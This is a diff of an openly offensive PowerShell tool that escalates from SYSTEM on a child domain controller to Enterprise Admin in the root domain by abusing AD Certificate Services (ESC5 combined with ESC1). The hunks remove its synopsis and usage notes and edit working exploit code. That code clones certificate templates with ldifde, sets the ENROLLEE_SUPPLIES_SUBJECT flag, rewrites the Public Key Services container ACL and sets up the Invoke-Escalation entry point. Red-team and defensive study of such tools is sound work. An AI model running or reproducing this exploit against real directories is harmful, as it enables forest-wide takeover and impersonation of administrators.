@@ -7,38 +7,6 @@ Author: Toby Jackson (heartburn)
 License: BSD 3-Clause
 Required Dependencies: None
 
-Synopsis:
-With SYSTEM access to a child domain controller, it is possible to add certificate templates that get propagated up the chain
-and emulated into the template store on the root domain. This is an abuse of ESC5 (See: ADCS Whitepaper by Spectre Ops), which
-we can combine with adding a certificate template vulnerable to ESC1. This was demonstrated in the "From DA to EA" blog post 
-by @wald0, viewable in the "Recommend Reading" section below.
-
-As a result of publishing a malicious template on the child domain, it becomes available in the root domain's certificate 
-store and we can modify the permissions on the template to allow a user of our choice the ability to enrol in it.
-This, plus the addition of the ENROLLEE_SUPPLIES_SUBJECT flag in the msPKI-Certificates-Name-Flag field, enables the user
-to obtain a ticket with an arbitrary UPN, such as an Enterprise Administrator.
-
-As a follow-up, Vadims Podāns of PKI Solutions discovered a way to abuse this primitive on a child domain when ADCS
-is not even installed on the root domain! As SYSTEM on the child, you can install the service and set up the necessary
-templates too - which of course - gets propagated up to the root domain again. 
-
-I highly recommend reading the original research in the links below, they are eloquently written and very well explained.
-This PowerShell script allows both primitives to be abused, such that it can be run from SYSTEM shells on child domains
-whether the ADCS service is running or not.
-
-One key note is that if you are installing ADCS, the exploit can still work, but the requested certificate cannot be 
-immediately used. Whilst the certificate container gets replicated almost immediately up to the parent (root) domain,
-the DC itself (I believe) does not auto-enrol for a short period of time. In this period, the certificate is likely to
-return a "KDC_ERROR_CLIENT_NOT_TRUSTED" when using it to authenticate. Sit tight - it should become valid sooner or later.
-
-Recommended reading and source code usage from:
-https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c
-https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/
-
-Example Usage:
-
-# Perform escalation
-Invoke-Escalation -Username GANON -TemplateName SneakyTemplate
 #>
 
 # Import AD module
@@ -64,7 +32,6 @@ function Is-SystemAccount {
     }
 }
 
-
 function Modify-Template {
 <#
 .SYNOPSIS
@@ -75,11 +42,6 @@ Modifies a given template to add the ESC1 vulnerability.
 .DESCRIPTION
 
 Ensures that the ENROLLEE_SUPPLIES_SUBJECT flag is set to true.
-
-
-.RETURNS 
-
-Nothing - Maybe this is a TODO? 
 
 #>
     Param (
@@ -109,7 +71,7 @@ Nothing - Maybe this is a TODO?
     echo "[*] Storing modified template in: $OutTemplate"
 
     # Copy current given template
-    ldifde -m -v -d "CN=$ExistingTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$rootDomain,DC=$tld" -f $TemplateCopy
+    ldifde -m -v -d "CN=$ExistingTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$rootDomain,DC=$tld" -f $TemplateCopy
 
 
     # Add Enrolee supplies subject and modify certificate template - Doing this off a current template in the environment 
@@ -289,7 +251,6 @@ The CA Name (Used for filtering AD objects).
     }
 }
 
-
 function Modify-PublicKeyServicesContainer {
 <#
 .SYNOPSIS
@@ -303,6 +264,11 @@ The Public Key Services container (CN=Public Key Services) grants the SYSTEM use
 underlying Enrollment Services container (CN=Enrollment Services), which specifically contains the pKIEnrollmentService
 class, does not. However, since inheritence is allowed on the object, if we can modify the "This object only" to 
 "This object and its descendants" then we'll have full control, and therefore be able to modify the container/enable templates!
+
+.RETURNS 
+
+TODO: Add checks
+
 #>
 
     $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
@@ -324,7 +290,6 @@ class, does not. However, since inheritence is allowed on the object, if we can 
     $PKSObject.commitchanges()
 }
 
-
 function Invoke-Escalation {
 <#
 .SYNOPSIS
@@ -336,7 +301,6 @@ Encompassing function to perform the exploit. This is the main function that you
 
 The function works in multiple stages:
 - Identify if the SYSTEM user is running the script
-- Get current ADCS details and CA name
 - Lists available templates and copies one into a temporary .ldf file
 - Modifies the copied template to be vulnerable to ESC1
 - Imports the modified template to the certificate store - This gets propogated into the root certificate store
@@ -353,7 +317,6 @@ The username that you wish to grant ESC1 abuse for. No need to pass the domain.
 .PARAMETER TemplateName
 
 The name of the template that will be added for ESC1 abuse.
-
 
 .EXAMPLE
 
@@ -373,7 +336,6 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate
        [Parameter(Position = 1, Mandatory=$true)]
        [String]
        $TemplateName
-
     )
     
     # Check whether we are running as SYSTEM
@@ -381,12 +343,13 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate
 
     # Environment initialization
     $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
-    $RootDomain =  Get-ADForest | select -ExpandProperty RootDomain
-    $ChildDomain = Get-ADDomain | select -ExpandProperty NetBIOSName
-    echo "[+] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain root domain !"
+    $RootDomain =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-2]
+    $ChildDomain = $env:USERDomain
+    echo "[*] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain.$Tld root domain!"
+
+    
     # Get the current CA name
     $CAName = (Get-ADObject -Filter 'ObjectClass -eq "pKIEnrollmentService"' -SearchBase (Get-ADRootDSE).ConfigurationNamingContext).Name
-    
     
     # Get a list of existing templates to find one to make a clone of
     $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
@@ -396,6 +359,7 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate
     $PKSObject = $ds.Findone().GetDirectoryEntry()
     $TemplateList = $PKSObject.certificateTemplates
     # Check that there are templates found to make a copy from
+    # TODO: Try to create a static template so we can continue in environments that have ADCS but no templates published?
     if ($TemplateList.count -lt 1) {
         echo "[!] No templates have been found to copy! Maybe there is none in use in the environment. Exiting..."
         sleep 5
